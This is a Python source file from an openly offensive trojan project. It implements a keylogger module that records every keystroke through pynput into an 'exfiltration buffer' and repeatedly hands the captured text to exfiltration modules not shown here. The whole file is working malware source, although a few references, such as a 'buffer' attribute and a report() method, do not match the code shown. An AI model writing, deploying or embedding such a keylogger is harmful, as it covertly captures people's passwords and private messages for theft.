#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import time

from pynput.keyboard import Key, Listener

from src.modules.exploitation.exploitation_module import ExploitationModule


class KeyboardMonitor:
    """Set up a keyboard listener that monitors keystroke events."""

    '''Mapping of key names to string characters for human-readable 
    text output. Add more mappings as necessary depending on the 
    host and the character set it works with.'''
    key_mapping: dict[str, str] = {"space": " "}

    def __init__(self):
        self._buffer = list()
        self._listener = Listener(on_press=self._on_press).start()

    def __str__(self):
        return "".join(self._buffer)

    def _on_press(self, key: Key) -> None:
        """Add the string representation of each keystroke captured
        'on press' by the listener thread to the exfiltration buffer."""
        try:  # A key was pressed and caught by the listener
            pressed_key: str = key.char  # The key is alphanumeric
        except AttributeError:  # The key is special
            try:  # Translate the key's value through custom mapping...
                pressed_key = self.key_mapping[key.name]
            except KeyError:  # ... or use the key's name as a result
                try:  # The special key is valid and has a name...
                    pressed_key = f"[{key.name.upper()}]"
                except AttributeError:  # ... or is unknown
                    pressed_key = "[???]"
        self.push(pressed_key)

    def push(self, key: str) -> None:
        """Add the string representation of a keystroke to the
        exfiltration buffer."""
        self._buffer.append(key)

    def flush(self) -> list:
        """Clear the monitor buffer and return its contents."""
        contents = self._buffer[:]
        self._buffer.clear()
        return contents


class KeyLogger(ExploitationModule):
    def __init__(self, *,
                 start_message: str = "Keylogger Initialized",
                 exfil_time: float = None):
        """Set up a keyboard listener that monitors keystroke events
        and send them to pre-configured exfiltration methods.

        Args:
            start_message: String defining a message that will be
                inserted on the exfiltration buffer upon initialization.
                Useful for signaling that the service is active.
        """
        super().__init__(exfil_time)
        self.monitor = KeyboardMonitor()
        self.monitor.buffer.append(start_message)

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        message: str = self.report()
        self.monitor.flush()
        [exfiltrator.update(message) for exfiltrator in self._exfiltrators]

    @property
    def contents(self) -> str:
        return str(self.monitor)

    def execute(self) -> None:
        """Start the keylogger, capture keyboard events and notify all
        registered exfiltrators."""
        while True:
            self._notify_all_exfiltrators()
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
